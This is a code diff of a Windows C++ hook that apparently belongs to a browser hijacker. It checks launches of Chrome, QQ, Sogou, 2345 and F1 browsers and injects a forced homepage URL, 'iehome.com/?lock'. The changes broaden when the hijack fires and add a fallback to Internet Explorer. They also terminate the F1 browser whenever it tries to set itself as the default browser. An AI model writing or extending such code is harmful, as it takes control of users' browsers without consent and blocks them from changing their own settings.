@@ -17,7 +17,7 @@ namespace {
 		_W("chrome.exe")/* Chrome 核心浏览器*/,
 		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
 		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
-		_W("baidubrowser.exe")/* 百度 核心浏览器*/,
+//		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
 		_W("f1browser.exe")/* F1 核心浏览器*/,
 		_W("2345explorer.exe")/* 2345 核心浏览器*/,
 
@@ -210,6 +210,7 @@ bool Hook::StartCommandLineHook()
 	}
 
 	if (false == bIsHookProcess) {
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Execute process commandline not hit.", GetCurrentProcessId());
 		return false;
 	}
 
@@ -218,37 +219,41 @@ bool Hook::StartCommandLineHook()
 
 	wszParentProcessName[0] = L'\\';
 	if (-1 == dwParentProcessID || false == GetProcessNameByProcessId(dwParentProcessID, &wszParentProcessName[1])) {
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Query parent name failed.", GetCurrentProcessId());
 		return false;
 	}
 
 	if (NULL != wcsistr(pcwszStartImagePathName, wszParentProcessName)) {
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] Parent Name: %s", GetCurrentProcessId(), wszParentProcessName);
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Parent name: %s", GetCurrentProcessId(), wszParentProcessName);
 		return false;
 	}
 
 	WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };
 
 	if (false == GetUrlAssociationbyProtocol(L"http", wszProtocolCommandLine, sizeof(wszProtocolCommandLine))) {
-		return false;
+		wcscpy(wszProtocolCommandLine, _W("C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"));
+
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Query url associationby protocol failed.", GetCurrentProcessId());
+		//return false;
 	}
 
 	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
 	Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association: %s", GetCurrentProcessId(), wszProtocolCommandLine);
 
-	bool bIsHit = FindRedirectURL(pcwszStartCommandLine);
+	bIsHookProcess = FindRedirectURL(pcwszStartCommandLine);
 
 	if (NULL != wcsistr(wszProtocolCommandLine, pcwszStartImagePathName)) {
 		Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association Hit: %s", GetCurrentProcessId(), wszProtocolCommandLine);
 
 		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) { // 如果不包含 HTTP
-			bIsHit = true;  // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
+			bIsHookProcess = true;  // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
 		}
 
 		if (NULL != wcsistr(pcwszStartCommandLine, L"-")) { // 如果有任意参数
-			bIsHit = false; // 放过
+			bIsHookProcess = false; // 放过
 		}
 
-		if (false == bIsHit) {
+		if (false == bIsHookProcess) {
 			pcwszNewParameter = NULL;
 		}
 	}
@@ -260,31 +265,44 @@ bool Hook::StartCommandLineHook()
 	////////////////////////////////////////////////////////////////////////////////////////////
 	// 例外规则
 
-	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ浏览器
+	if (NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ浏览器
 
 		if (NULL != wcsistr(pcwszStartCommandLine, L"-sc=desktopshortcut")) { // 如果不是桌面图标触发的,按条件放过
 			Global::Log.PrintW(LOGOutputs, L"[% 5u] QQ Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 		}
 		else {
-
-			if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的, 如打开空间等
+			if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的
+				pcwszNewParameter = NULL;
+			}
+			if (NULL != wcsistr(pcwszStartCommandLine, L"/web=")) { // 打开空间等
 				pcwszNewParameter = NULL;
 			}
 
 			if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // 只要不包含 URL 均不进行劫持
 				pcwszNewParameter = NULL;
 			}
+
+			if (false == bIsHookProcess) {
+				pcwszNewParameter = NULL;
+			}
 		}
 	}
 
-	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\2345explorer.exe")) {// F1浏览器 
+	if (NULL != wcsistr(pcwszStartImagePathName, L"\\sogouexplorer.exe")) {// 搜狗浏览器
+		
+		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) { // QQ 触发的
+				pcwszNewParameter = NULL;
+		}
+	}
+
+	if (NULL != wcsistr(pcwszStartImagePathName, L"\\2345explorer.exe")) {// F1浏览器 
 		if (NULL != wcsistr(pcwszStartCommandLine, L"--shortcut=desktop")) { // 通过桌面快捷方式启动
 			pcwszNewParameter = L"http://www.iehome.com/?lock";
 			Global::Log.PrintW(LOGOutputs, L"[% 5u] 2345 Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 		}
 	}
 
-	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1浏览器 
+	if (NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1浏览器 
 		if (NULL != wcsistr(pcwszStartCommandLine, L"set-default")) { // 禁止其设置默认浏览器
 			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 			::ExitProcess(0);
